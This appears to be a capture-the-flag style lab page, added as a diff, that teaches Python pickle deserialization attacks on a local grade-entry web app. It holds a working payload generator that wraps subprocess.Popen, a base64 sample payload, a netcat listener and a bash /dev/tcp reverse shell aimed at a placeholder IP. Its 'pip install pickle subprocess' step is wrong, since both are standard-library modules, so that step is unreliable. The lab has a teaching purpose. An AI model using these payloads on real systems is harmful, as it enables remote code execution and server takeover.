@@ -1,0 +1,149 @@
+import Question from "../components/question";
+
+# Deserialization Lab 🧪🧬
+
+In this lab we will dive into the world of Deserialization. You will have to exploit a web application that is vulnerable to Deserialization. This website deserializes a cookie for you. To learn what Deserialization is and how to exploit it you will have a couple of objectives.
+
+## Lab Objectives 🎯
+
+1. **Install Burp Suite:**: Install Burp Suite and configure your browser to use it.
+2. **Install wireshark:**: Install wireshark and capture the request that is sent to the server.
+3. **Capture the request:**: Capture the request that is sent to the server.
+4. **Change the payload:**: Change the payload to execute a command on the server.
+5. **Confirm you have access:**: Confirm you have access to the server.
+6. **Insert a reverse shell:**: Insert a reverse shell into the payload.
+7. **Connect to the server:**: Connect to the server using the reverse shell.
+
+## Instructions 📝
+
+### Chapter 1: Installing Burp Suite
+
+Install Burp Suite and configure your browser to use it. [Download Burp Suite](https://portswigger.net/burp/documentation/desktop/getting-started/download-and-install)
+
+### Chapter 2: Installing Wireshark
+
+Install Wireshark. [Download Wireshark](https://www.wireshark.org/download.html)
+
+### Chapter 3: Capturing the request
+
+First Open Burpsuite. Then capture the request that is sent to the server when you click on the `Add Grade` button. [capture the request](https://portswigger.net/burp/documentation/desktop/getting-started/intercepting-http-traffic)
+
+### Chapter 4: Changing the payload
+
+You see that the request looks something like this:
+
+```
+POST /add_grade HTTP/1.1
+Host: 127.0.0.1:8989
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://127.0.0.1:8989/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 127
+Origin: http://127.0.0.1:8989
+Connection: close
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+
+student=gASVOQAAAAAAAACMCnN1YnByb2Nlc3OUjAVQb3BlbpSTlCiMBHBpbmeUjAc4LjguOC44lIwCLWOUjAE1lHSUhZRSlC4=&subject=Mathematik&grade=1
+```
+
+Now we need to change the payload to execute a command on the server. Master hacker Rashia Eisi has written you a python script to write a reverse shell into the payload:
+
+```python
+import pickle
+import subprocess
+import base64
+
+class Payload:
+    def __reduce__(self):
+        user_cmd = input("Enter the command you want to execute: ").strip()
+        cmd = user_cmd.split(' ')
+        return (subprocess.Popen, (cmd,))
+
+def create_payload():
+    serialized_payload = pickle.dumps(Payload())
+    encoded_payload = base64.b64encode(serialized_payload).decode()
+    print(f"Base64 Encoded Payload: {encoded_payload}")
+
+def test_payload():
+    p = input("Enter the base64-encoded payload: ")
+    data = base64.b64decode(p)
+    print("Attempting to deserialize payload...")
+    try:
+        pickle.loads(data)
+    except Exception as e:
+        print(f"Error deserializing payload: {e}")
+
+def main():
+    choice = input("Do you want to (create) a payload or (test) a payload? Enter 'create' or 'test': ").strip().lower()
+    if choice == 'create':
+        create_payload()
+    elif choice == 'test':
+        test_payload()
+    else:
+        print("Invalid choice. Please enter 'create' or 'test'.")
+
+if __name__ == "__main__":
+    main()
+```
+
+The script needs a couple dependencies to work. You can install them with the following command:
+
+```bash
+pip install pickle subprocess
+```
+
+Copy this into a file and use this script to generate a payload. Find out the current ip of your machine and create a payload with pinging your machine. You can use the script above like this to generate a payload:
+
+```bash
+❯ python3 payload.py
+Do you want to (create) a payload or (test) a payload? Enter 'create' or 'test': create
+Enter the command you want to execute: ping <my ip> -c 5
+Base64 Encoded Payload: <output>
+```
+
+You can use the test option to test if the payload is working.
+
+You can put the payload into the student field.
+
+### Chapter 5: Confirming you have access
+
+Now we open wireshark and set the selection to pings.
+
+<Question questionNr={1} />
+
+Normally this should be empty before you do anything. Now we forward the request to the server and see if we get a request.
+
+Now we see the origin IP Adress of the server. If you see a request from the server, you have access to the server. Show this in your lab.
+
+### Chapter 6: Inserting a reverse shell
+
+Now we need to start a listener on our machine. You can do this with the following command:
+
+```bash
+nc -lvp 2222
+```
+
+Now create a payload for the reverse shell. You can use the provided script script to generate a payload which contains this command:
+
+```bash
+❯ bash -c 'bash -i >& /dev/tcp/<YOUR-IP>/2222 0>&1'
+```
+
+### Chapter 7: Connecting to the server
+
+Now when you execute this command on the server you should get a reverse shell. You can do this by putting the payload into the student field. Then the nc listeners turns into a shell on your machine which is connected to the server.(basically like ssh)
+
+There is a flag file in the /app directory.
+
+<Question questionNr={2} />
+
+## 🎉🎉🎉🎉 Congratulations! 🎉🎉🎉🎉
+
+You have successfully hacked the server. You are now a master hacker. 🎩🎩🎩 Submit the Correct awnsers with your account visible in the screenshots to complete the lab.
